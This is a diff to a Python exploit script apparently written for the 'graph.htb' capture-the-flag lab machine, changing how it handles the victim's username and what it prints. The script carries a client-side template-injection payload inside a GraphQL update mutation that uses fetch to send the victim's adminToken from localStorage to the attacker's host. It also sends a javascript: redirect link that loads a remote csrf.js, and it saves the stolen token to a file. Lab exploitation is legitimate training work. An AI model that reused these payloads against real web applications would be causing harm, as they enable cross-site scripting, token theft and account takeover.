@@ -187,7 +187,7 @@ def create_account(proxy_config=None):
         return None
     
     print("[+] Login successful")
-    print(f"[+] Auth token: {auth_token}")
+    print(f"[+] JohnDoe's Auth Token: {auth_token}")
     return auth_token
 
 def exfil_admin_token(john_auth_token, lhost, proxy_config=None, server_port=80):
@@ -219,6 +219,7 @@ def exfil_admin_token(john_auth_token, lhost, proxy_config=None, server_port=80)
     try:
         messages_body = req_messages.json()
         victim_username = messages_body["data"]["Messages"][0]["fromUserName"]
+        victim_username_lower = victim_username.lower()
         print(f"[+] Victim username: {victim_username}")
     except (KeyError, IndexError, ValueError) as e:
         print(f"[-] Error parsing messages: {e}")
@@ -255,10 +256,10 @@ req.withCredentials = true;
 var body = JSON.stringify({{
     operationName: "update",
     variables: {{
-        firstname: "sally",
+        firstname: "{victim_username_lower}",
         lastname: "{{{{constructor.constructor('fetch(\\"http://{lhost}:{server_port}/token?adminToken=\\" + localStorage.getItem(\\"adminToken\\"))')()}}}}",
         id: "{victim_acc_id}",
-        newusername: "sally"
+        newusername: "{victim_username_lower}"
     }},
     query: "mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {{update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){{username,email,id,firstname,lastname,adminToken}}}}"
 }});
@@ -280,7 +281,7 @@ req.send(body);
         "query": "mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}", 
         "variables": {
             "text": f"http://graph.htb/?redirect=javascript:document.body.innerHTML%2B%3D'<script%20src%3d\"http://{lhost}:{server_port}/csrf.js\"></script>'", 
-            "to": "sally@graph.htb"
+            "to": f"{victim_username_lower}@graph.htb"
         }
     }
     
@@ -337,8 +338,8 @@ def main():
             proxy_config = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}
     
     print(f"[*] Starting exploit")
-    print(f"[*] Local host: {args.lhost}")
-    print(f"[*] Server port: {args.port}")
+    print(f"[*] Attacker server host: {args.lhost}")
+    print(f"[*] Attacker Server port: {args.port}")
     print(f"[*] Proxy: {proxy_config}")
     
     try:
@@ -354,7 +355,7 @@ def main():
         if success:
             print("[+] Exploit completed successfully!")
             if os.path.exists("admin_token.txt"):
-                with open("admin_token.txt", "r") as f:
+                with open("admin_token.txt", "r", encoding="utf-8") as f:
                     token = f.read().strip()
                     print(f"[+] Admin token saved to admin_token.txt: {token}")
             return 0
